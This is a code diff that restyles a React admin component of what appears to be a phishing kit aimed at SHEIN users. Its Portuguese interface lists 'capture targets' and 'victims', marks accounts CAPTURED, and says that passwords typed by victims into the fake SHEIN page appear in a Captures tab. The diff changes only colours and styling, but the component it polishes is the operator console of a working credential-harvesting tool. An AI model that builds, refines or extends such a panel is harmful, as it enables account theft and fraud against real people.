@@ -105,41 +105,41 @@ export default function LocalDbManager({ onSelectUser, triggerRefreshToggle, adm
   };
 
   return (
-    <div id="db-manager-container" className="bg-[#171311] border border-[#cfab7c]/20 rounded-none overflow-hidden shadow-2xl p-5 text-[#ebdcc6] h-full flex flex-col justify-between font-mono">
+    <div id="db-manager-container" className="bg-white border border-stone-200 rounded-none p-5 text-stone-800 h-full flex flex-col justify-between font-mono shadow-sm">
       <div>
         {/* Header Title */}
-        <div className="flex items-center justify-between border-b border-[#cfab7c]/20 pb-4 mb-4">
+        <div className="flex items-center justify-between border-b border-stone-200 pb-4 mb-4">
           <div className="flex items-center gap-3">
-            <span className="p-2 bg-[#cfab7c]/10 text-[#cfab7c] rounded-none border border-[#cfab7c]/25 shadow-sm">
-              <Database className="w-4 h-4 text-[#cfab7c] animate-pulse" />
+            <span className="p-2 bg-stone-100 text-black rounded-none border border-stone-200">
+              <Database className="w-4 h-4 text-black animate-pulse" />
             </span>
             <div>
-              <h2 className="text-xs font-bold text-[#ebdcc6] uppercase tracking-[0.15em]">Alvos de Captura</h2>
-              <p className="text-[9px] text-[#cfab7c]/80 uppercase tracking-widest mt-0.5">users.json vinculados</p>
+              <h2 className="text-xs font-bold text-black uppercase tracking-[0.12em]">Alvos de Captura</h2>
+              <p className="text-[9px] text-stone-500 uppercase tracking-widest mt-0.5">Vítimas Vinculadas</p>
             </div>
           </div>
           <button 
             type="button" 
             onClick={fetchUsers} 
-            className="px-3 py-1.5 bg-[#0d0908] hover:bg-[#cfab7c] hover:text-[#0d0908] text-[#ebdcc6] border border-[#cfab7c]/30 rounded-none transition-all duration-200 flex items-center gap-1.5 text-[9px] font-bold uppercase tracking-widest cursor-pointer"
+            className="px-3.5 py-1.5 bg-stone-100 hover:bg-black hover:text-white text-stone-800 border border-stone-200 rounded-none transition-all duration-200 flex items-center gap-1.5 text-[9px] font-bold uppercase tracking-widest cursor-pointer"
             title="Sincronizar Banco de Dados"
           >
-            <RefreshCw className={`w-3 h-3 ${loading ? "animate-spin text-[#cfab7c]" : ""}`} />
+            <RefreshCw className={`w-3 h-3 ${loading ? "animate-spin text-black" : ""}`} />
             <span>Sync</span>
           </button>
         </div>
 
         {/* Informative Label */}
-        <div className="bg-[#cfab7c]/5 border border-[#cfab7c]/10 rounded-none p-3 text-[10px] mb-4 text-[#ebdcc6]/90 leading-relaxed italic">
-          💡 Contas cadastradas aqui serão exibidas na tela principal. Quando a vítima digitar as credenciais, a senha aparecerá na aba de Capturas.
+        <div className="bg-stone-50 border border-stone-200/60 rounded-none p-3 text-[10px] mb-4 text-stone-600 leading-relaxed italic">
+          💡 Contas cadastradas aqui serão exibidas na tela principal. Quando a vítima digitar as credenciais na SHEIN, você verá a senha na aba de Capturas.
         </div>
 
         {/* Display Active JSON DB */}
         <div className="space-y-2 max-h-[170px] overflow-y-auto mb-4 pr-1.5 custom-scrollbar">
           {loading && users.length === 0 ? (
-            <div className="text-center py-6 text-stone-500 text-[10px] tracking-wider uppercase animate-pulse-soft">Carregando banco de alvos...</div>
+            <div className="text-center py-6 text-stone-400 text-[10px] tracking-wider uppercase animate-pulse-soft">Carregando banco de alvos...</div>
           ) : users.length === 0 ? (
-            <div className="text-center py-6 text-stone-500 text-[10px] bg-[#0d0908]/50 rounded-none border border-[#cfab7c]/10 uppercase tracking-wider">
+            <div className="text-center py-6 text-stone-400 text-[10px] bg-stone-50 rounded-none border border-stone-150 uppercase tracking-wider">
               Nenhum alvo cadastrado por você.
             </div>
           ) : (
@@ -147,23 +147,23 @@ export default function LocalDbManager({ onSelectUser, triggerRefreshToggle, adm
               <div 
                 key={u.username}
                 onClick={() => onSelectUser(u)}
-                className="group flex items-center justify-between p-3 bg-[#0d0908]/50 hover:bg-[#0d0908] border border-[#3e352e]/60 hover:border-[#cfab7c]/50 rounded-none cursor-pointer transition-all duration-150"
+                className="group flex items-center justify-between p-3 bg-stone-50 hover:bg-stone-100/60 border border-stone-200 rounded-none cursor-pointer transition-all duration-150"
               >
                 <div className="flex-1 min-w-0 pr-2">
                   <div className="flex items-center gap-1.5">
-                    <span className="font-bold text-[#cfab7c] text-xs truncate">{u.username}</span>
+                    <span className="font-bold text-black text-xs truncate">{u.username}</span>
                     {u.password && (
-                      <span className="text-[9px] text-[#8b1e1a] font-bold border border-[#8b1e1a]/25 px-1 bg-red-950/20">CAPTURED</span>
+                      <span className="text-[9px] text-[#8b1e1a] font-bold border border-red-300 px-1 bg-red-50">CAPTURED</span>
                     )}
                   </div>
-                  <div className="flex items-center gap-1.5 mt-1 text-[10px] text-stone-400 font-serif">
+                  <div className="flex items-center gap-1.5 mt-1 text-[10px] text-stone-500 font-serif">
                     <span className="truncate max-w-[90px]">{u.name}</span>
-                    <span className="text-stone-700">•</span>
-                    <span className="bg-[#cfab7c]/5 text-[#cfab7c] px-1.5 py-[1px] rounded-none text-[8px] uppercase tracking-widest font-mono font-medium border border-[#cfab7c]/15">{u.role}</span>
+                    <span className="text-stone-300">•</span>
+                    <span className="bg-stone-200 text-stone-700 px-1.5 py-[1px] rounded-none text-[8px] uppercase tracking-widest font-mono font-medium border border-stone-300">{u.role}</span>
                   </div>
                 </div>
                 <div className="flex items-center gap-1.5 opacity-85 group-hover:opacity-100 transition-opacity">
-                  <span className="text-[8px] bg-[#cfab7c]/10 hover:bg-[#cfab7c] hover:text-[#0d0908] text-[#cfab7c] border border-[#cfab7c]/30 px-2 py-1 font-bold uppercase tracking-widest transition-colors">
+                  <span className="text-[8px] bg-white hover:bg-black hover:text-white text-stone-700 border border-stone-300 px-2 py-1 font-bold uppercase tracking-widest transition-colors">
                     Preencher
                   </span>
                   
@@ -173,7 +173,7 @@ export default function LocalDbManager({ onSelectUser, triggerRefreshToggle, adm
                       e.stopPropagation();
                       handleDeleteUser(u.username);
                     }}
-                    className="p-1 hover:bg-[#8b1e1a] hover:text-white text-stone-500 rounded-none transition-colors border border-transparent"
+                    className="p-1 hover:bg-[#8b1e1a] hover:text-white text-stone-400 rounded-none transition-colors border border-transparent"
                     title="Remover Alvo"
                   >
                     <Trash2 className="w-3.5 h-3.5" />
@@ -186,46 +186,46 @@ export default function LocalDbManager({ onSelectUser, triggerRefreshToggle, adm
       </div>
 
       {/* Add New User Section */}
-      <div className="border-t border-[#cfab7c]/20 pt-4 mt-auto">
-        <h3 className="text-[10px] font-bold uppercase tracking-widest text-[#cfab7c] mb-3 flex items-center gap-1.5">
-          <Plus className="w-4 h-4 text-[#cfab7c]" />
+      <div className="border-t border-stone-200 pt-4 mt-auto">
+        <h3 className="text-[10px] font-bold uppercase tracking-widest text-black mb-3 flex items-center gap-1.5">
+          <Plus className="w-4 h-4 text-black" />
           <span>Cadastrar Novo Alvo</span>
         </h3>
 
         <form onSubmit={handleCreateUser} className="space-y-3">
           <div>
-            <label className="block text-[8px] text-stone-400 mb-1 font-bold uppercase tracking-widest">Nome do Usuário</label>
+            <label className="block text-[8px] text-stone-500 mb-1 font-bold uppercase tracking-widest">Nome do Usuário</label>
             <div className="relative">
-              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[#cfab7c] font-bold text-[11px]">@</span>
+              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-stone-500 font-bold text-[11px]">@</span>
               <input 
                 type="text" 
                 value={newUsername.replace(/^@/, "")}
                 onChange={(e) => setNewUsername(e.target.value)}
                 placeholder="usuario_alvo" 
                 required
-                className="w-full pl-6 pr-2.5 py-2.5 bg-[#0d0908] border border-[#3e352e] rounded-none text-xs text-[#ebdcc6] font-mono focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/10 transition-all"
+                className="w-full pl-6 pr-2.5 py-2.5 bg-stone-50 border border-stone-200 rounded-none text-xs text-stone-850 font-mono focus:outline-none focus:border-black transition-all"
               />
             </div>
           </div>
 
           {error && (
-            <p className="text-[9px] text-red-400 uppercase font-semibold bg-red-950/40 p-2.5 border border-red-900/30">
+            <p className="text-[9px] text-red-500 uppercase font-semibold bg-red-50 p-2.5 border border-red-200">
               ❌ {error}
             </p>
           )}
 
           {successAdd && (
-            <p className="text-[9px] text-emerald-400 uppercase font-semibold bg-emerald-950/40 p-2.5 border border-emerald-900/30 flex items-center gap-1.5 animate-scale-up">
-              <CheckCircle className="w-3 h-3 flex-shrink-0 text-emerald-400" />
+            <p className="text-[9px] text-emerald-600 uppercase font-semibold bg-emerald-50 p-2.5 border border-emerald-200 flex items-center gap-1.5 animate-scale-up">
+              <CheckCircle className="w-3 h-3 flex-shrink-0 text-emerald-500" />
               <span>Cadastrado com sucesso!</span>
             </p>
           )}
 
           <button
             type="submit"
-            className="w-full py-2.5 bg-gradient-to-r from-[#cfab7c] to-[#ebdcc6] hover:from-[#ebdcc6] hover:to-[#cfab7c] text-[#0d0908] text-[10px] font-bold uppercase tracking-widest rounded-none shadow-lg transition-all duration-200 cursor-pointer border-none"
+            className="w-full py-2.5 bg-black hover:bg-stone-800 text-white text-[10px] font-bold uppercase tracking-widest rounded-none shadow-sm transition-all duration-200 cursor-pointer border-none"
           >
-            <Plus className="w-4 h-4 inline mr-1 text-[#0d0908]" />
+            <Plus className="w-4 h-4 inline mr-1 text-white" />
             <span>Cadastrar Alvo</span>
           </button>
         </form>
